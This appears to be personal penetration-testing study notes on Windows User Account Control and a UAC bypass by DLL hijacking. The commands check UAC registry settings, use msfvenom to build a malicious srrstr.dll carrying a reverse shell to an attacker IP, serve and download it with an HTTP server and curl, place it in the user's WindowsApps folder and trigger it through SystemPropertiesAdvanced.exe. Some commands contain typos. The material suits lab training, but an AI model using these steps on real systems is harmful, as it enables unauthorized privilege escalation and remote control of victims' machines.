UAC is a feature that enables consent for elevated privileges.
https://learn.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works

List of registry keys:
https://learn.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account

![[Pasted image 20230107092515.png]]

```
Confirm UAC is Enabled:
REG QUERY HKEY_LOCAL_MACHINE\Sofware\Microsoft\Windows\CurrentVersion\Policies\System\
		/v EnableLUA

Checking UAC Level:
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\
		/v 

Checking Windows Version:
	[environment]::OSVersion.Version
```

![[Pasted image 20230107092941.png]]

https://github.com/hfiref0x/UACME project maintains a list of UAC bypasses.

###### When attempting to locate a DLL, Windows uses this following order:
```
1. The directory from which the applicaiton loaded
2. The System32 Directory C:\Windows\System32
3. 16-bit System Directory C:\Windows\System
4. The Windows Directory
5. Any directories listed in PATH

cmd /c echo %PATH%
```

## Scenario

32-bit `SystemPropertiesAdvanced.exe` attempts to load the non-existent DLL srrstr.dll, which is used
by System Restore functionality

![[Pasted image 20230107095051.png]]

WindowsApps is wihtin the user's path variable. We can potentially bypass UAC by using DLL
hijacking, placing a malicous `srrstr.dll` in the WindowsApps folder

## Generating Malicious srrstr.dll
```bash
msfvenom -p windows/shell_reverse_tcp LHSOT=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

sudo python3 -m http.server 8080
curl http://10.10.14.3:8080/srrstr.dll -O
"C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

#### Test Connection
```
rundll32 shell32.dll,Control_RunDLL \
		C:\Users\sarah]AppData\Local\Microsoft\WIndowsApps\srrstr.dll

C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

